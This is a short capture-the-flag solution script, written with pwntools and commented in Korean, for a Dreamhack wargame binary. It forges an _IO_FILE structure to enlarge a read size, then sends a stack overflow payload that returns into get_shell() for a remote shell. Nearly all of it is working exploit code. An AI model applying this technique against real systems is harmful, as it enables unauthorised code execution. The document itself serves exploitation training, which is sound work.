# 익스 설계
from pwn import *
#p = process('./iofile_aw')
p = remote('host3.dreamhack.games', 10044)
e = ELF('./iofile_aw')
libc = ELF('./libc-2.23.so')

get_shell = e.symbols['get_shell']
size = e.symbols['size']

payload = b''
payload += p64(0xfbad2080) # flags
payload += p64(0) #read_ptr
payload += p64(0) #read_end
payload += p64(0) #read_base
payload += p64(0) #write_base
payload += p64(0) #write_ptr
payload += p64(0) #write_end
payload += p64(size)
p.sendlineafter(b'# ', b'printf' + b' ' + payload)
p.sendlineafter(b'# ', b'read')
p.sendline(p64(1000))
payload = b''
payload += b'exit\x00'
payload += b'A' * 0x21B                     # buffer (0x220 - len('exit\x00'))
payload += b'B' * 0x08                      # SFP
payload += p64(get_shell)   # return address -> get_shell()
p.sendlineafter(b'# ', payload)

p.interactive()


## 취약점 설명
설명 할거는 별로 없고 IO_FILE overwrite로 size를 1000으로 만들고 bof로 품